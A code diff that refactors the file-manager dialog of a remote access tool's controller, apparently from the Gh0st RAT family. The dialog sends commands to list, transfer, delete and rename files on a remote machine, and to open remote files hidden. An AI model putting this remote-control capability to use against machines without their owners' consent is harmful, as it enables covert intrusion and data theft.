@@ -36,7 +36,7 @@ float GetScreenScalingFactor() {
 }
 
 CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
-	: CDialog(CFileManagerDlg::IDD, pParent)
+	: DialogBase(CFileManagerDlg::IDD, pParent, pIOCPServer, pContext, IDI_ICON_FATHER)
 {
 	m_fScalingFactor = GetScreenScalingFactor();
 	//{{AFX_DATA_INIT(CFileManagerDlg)
@@ -52,7 +52,6 @@ CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, Client
 		sizeof(SHFILEINFO), 
 		SHGFI_ICON | SHGFI_USEFILEATTRIBUTES
 		);
-	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_FATHER));
 	// 加载系统图标列表
 	static HIMAGELIST hImageList_Large = (HIMAGELIST)SHGetFileInfo
 		(
@@ -77,21 +76,10 @@ CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, Client
 	static CImageList *pSmall = CImageList::FromHandle(hImageList_Small);
 	m_pImageList_Small = pSmall;
 
-	// 初始化应该传输的数据包大小为0
-
-	m_iocpServer	= pIOCPServer;
-	m_pContext		= pContext;
-	sockaddr_in  sockAddr;
-	memset(&sockAddr, 0, sizeof(sockAddr));
-	int nSockAddrLen = sizeof(sockAddr);
-	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
-	
-	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
-
 	// 保存远程驱动器列表
 	memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
-	PBYTE pSrc = m_pContext->m_DeCompressionBuffer.GetBuffer(1);
-	int length = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
+	PBYTE pSrc = m_ContextObject->m_DeCompressionBuffer.GetBuffer(1);
+	int length = m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1;
 	if (length > 0)
 		memcpy(m_bRemoteDriveList, pSrc, length);
 
@@ -898,17 +886,9 @@ void CFileManagerDlg::OnClose()
 	// TODO: Add your message handler code here and/or call default
 	CoUninitialize();
 
-#if CLOSE_DELETE_DLG
-	m_pContext->v1 = 0;
-#endif
+	CancelIO();
 
-	closesocket(m_pContext->m_Socket);
-
-	CDialog::OnClose();
-	m_bIsClosed = true;
-#if CLOSE_DELETE_DLG
-	//delete this; //此处释放内存会在第2次崩溃
-#endif
+	DialogBase::OnClose();
 }
 
 CString CFileManagerDlg::GetParentDirectory(CString strPath)
@@ -935,15 +915,15 @@ CString CFileManagerDlg::GetParentDirectory(CString strPath)
 
 void CFileManagerDlg::OnReceiveComplete()
 {
-	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
+	switch (m_ContextObject->m_DeCompressionBuffer.GetBuffer(0)[0])
 	{
 	case TOKEN_FILE_LIST: // 文件列表
 		try
 		{
 			FixedRemoteFileList
 			(
-				m_pContext->m_DeCompressionBuffer.GetBuffer(0),
-				m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1
+				m_ContextObject->m_DeCompressionBuffer.GetBuffer(0),
+				m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1
 			);
 		}
 		catch (CMemoryException* e)
@@ -1039,7 +1019,7 @@ void CFileManagerDlg::GetRemoteFileList(CString directory)
 
 	bPacket[0] = COMMAND_LIST_FILES;
 	memcpy(bPacket + 1, m_Remote_Path.GetBuffer(0), PacketSize - 1);
-	m_iocpServer->Send(m_pContext, bPacket, PacketSize);
+	m_iocpServer->Send(m_ContextObject, bPacket, PacketSize);
 	LocalFree(bPacket);
 
 	m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);
@@ -1498,7 +1478,7 @@ BOOL CFileManagerDlg::SendDownloadJob()
  	bPacket[0] = COMMAND_DOWN_FILES;
  	// 文件偏移，续传时用
  	memcpy(bPacket + 1, file.GetBuffer(0), file.GetLength() + 1);
-	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);
+	m_iocpServer->Send(m_ContextObject, bPacket, nPacketSize);
 
 	LocalFree(bPacket);
 	// 从下载任务列表中删除自己
@@ -1555,7 +1535,7 @@ BOOL CFileManagerDlg::SendUploadJob()
 	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
 	memcpy(bPacket + 9, fileRemote.GetBuffer(0), fileRemote.GetLength() + 1);
 	
-	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);
+	m_iocpServer->Send(m_ContextObject, bPacket, nPacketSize);
 
 	LocalFree(bPacket);
 
@@ -1586,7 +1566,7 @@ BOOL CFileManagerDlg::SendDeleteJob()
 	}
 	// 文件偏移，续传时用
 	memcpy(bPacket + 1, file.GetBuffer(0), nPacketSize - 1);
-	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);
+	m_iocpServer->Send(m_ContextObject, bPacket, nPacketSize);
 	
 	LocalFree(bPacket);
 	// 从下载任务列表中删除自己
@@ -1614,14 +1594,14 @@ void CFileManagerDlg::CreateLocalRecvFile()
 		strDestDirectory += m_hCopyDestFolder + "\\";
 	}
 
-	FILESIZE	*pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
+	FILESIZE	*pFileSize = (FILESIZE *)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
 	DWORD	dwSizeHigh = pFileSize->dwSizeHigh;
 	DWORD	dwSizeLow = pFileSize->dwSizeLow;
 
 	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+long long(1))) + dwSizeLow;
 
 	// 当前正操作的文件名
-	m_strOperatingFile = m_pContext->m_DeCompressionBuffer.GetBuffer(9);
+	m_strOperatingFile = m_ContextObject->m_DeCompressionBuffer.GetBuffer(9);
 
 	m_strReceiveLocalFile = m_strOperatingFile;
 
@@ -1766,7 +1746,7 @@ void CFileManagerDlg::CreateLocalRecvFile()
 	else
 	{
 		// 发送继续传输文件的token,包含文件续传的偏移
-		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
+		m_iocpServer->Send(m_ContextObject, bToken, sizeof(bToken));
 	}
 }
 
@@ -1780,16 +1760,16 @@ void CFileManagerDlg::WriteLocalRecvFile()
 	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
 	FILESIZE	*pFileSize;
 	// 得到数据的偏移
-	pData = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
+	pData = m_ContextObject->m_DeCompressionBuffer.GetBuffer(nHeadLength);
 
-	pFileSize = (FILESIZE *)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
+	pFileSize = (FILESIZE *)m_ContextObject->m_DeCompressionBuffer.GetBuffer(1);
 	// 得到数据在文件中的偏移, 赋值给计数器
 	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);
 
 	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
 	LONG	dwOffsetLow = pFileSize->dwSizeLow;
 
-	dwBytesToWrite = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;
+	dwBytesToWrite = m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;
 
 	HANDLE	hFile = 
 		CreateFile
@@ -1839,7 +1819,7 @@ void CFileManagerDlg::WriteLocalRecvFile()
 		dwOffsetLow += dwBytesWrite;
 		memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
 		memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
-		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
+		m_iocpServer->Send(m_ContextObject, bToken, sizeof(bToken));
 	}
 }
 
@@ -1913,19 +1893,19 @@ void CFileManagerDlg::EndRemoteDeleteFile()
 void CFileManagerDlg::SendException()
 {
 	BYTE	bBuff = COMMAND_EXCEPTION;
-	m_iocpServer->Send(m_pContext, &bBuff, 1);
+	m_iocpServer->Send(m_ContextObject, &bBuff, 1);
 }
 
 void CFileManagerDlg::SendContinue()
 {
 	BYTE	bBuff = COMMAND_CONTINUE;
-	m_iocpServer->Send(m_pContext, &bBuff, 1);
+	m_iocpServer->Send(m_ContextObject, &bBuff, 1);
 }
 
 void CFileManagerDlg::SendStop()
 {
 	BYTE	bBuff = COMMAND_STOP;
-	m_iocpServer->Send(m_pContext, &bBuff, 1);
+	m_iocpServer->Send(m_ContextObject, &bBuff, 1);
 }
 
 void CFileManagerDlg::ShowProgress()
@@ -2085,12 +2065,12 @@ void CFileManagerDlg::SendTransferMode()
 	BYTE bToken[5];
 	bToken[0] = COMMAND_SET_TRANSFER_MODE;
 	memcpy(bToken + 1, &m_nTransferMode, sizeof(m_nTransferMode));
-	m_iocpServer->Send(m_pContext, (unsigned char *)&bToken, sizeof(bToken));
+	m_iocpServer->Send(m_ContextObject, (unsigned char *)&bToken, sizeof(bToken));
 }
 
 void CFileManagerDlg::SendFileData()
 {
-	FILESIZE *pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
+	FILESIZE *pFileSize = (FILESIZE *)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
 	LONG	dwOffsetHigh = pFileSize->dwSizeHigh ;
 	LONG	dwOffsetLow = pFileSize->dwSizeLow;
 
@@ -2130,7 +2110,7 @@ void CFileManagerDlg::SendFileData()
 	if (nNumberOfBytesRead > 0)
 	{
 		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
-		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
+		m_iocpServer->Send(m_ContextObject, lpBuffer, nPacketSize);
 	}
 	LocalFree(lpBuffer);
 }
@@ -2209,7 +2189,7 @@ void CFileManagerDlg::OnRemoteNewfolder()
 		LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, file.GetLength() + 2);
 		lpBuffer[0] = COMMAND_CREATE_FOLDER;
 		memcpy(lpBuffer + 1, file.GetBuffer(0), nPacketSize - 1);
-		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
+		m_iocpServer->Send(m_ContextObject, lpBuffer, nPacketSize);
 		LocalFree(lpBuffer);
 	}
 }
@@ -2276,7 +2256,7 @@ void CFileManagerDlg::OnEndlabeleditListRemote(NMHDR* pNMHDR, LRESULT* pResult)
 		memcpy(lpBuffer + 1, strExistingFileName.GetBuffer(0), strExistingFileName.GetLength() + 1);
 		memcpy(lpBuffer + 2 + strExistingFileName.GetLength(), 
 			strNewFileName.GetBuffer(0), strNewFileName.GetLength() + 1);
-		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
+		m_iocpServer->Send(m_ContextObject, lpBuffer, nPacketSize);
 		LocalFree(lpBuffer);
 	}
 	*pResult = 1;
@@ -2345,7 +2325,7 @@ void CFileManagerDlg::OnRemoteOpenShow()
 	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
 	lpPacket[0] = COMMAND_OPEN_FILE_SHOW;
 	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
-	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
+	m_iocpServer->Send(m_ContextObject, lpPacket, nPacketLength);
 	LocalFree(lpPacket);
 }
 
@@ -2359,7 +2339,7 @@ void CFileManagerDlg::OnRemoteOpenHide()
 	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
 	lpPacket[0] = COMMAND_OPEN_FILE_HIDE;
 	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
-	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
+	m_iocpServer->Send(m_ContextObject, lpPacket, nPacketLength);
 	LocalFree(lpPacket);
 }
 
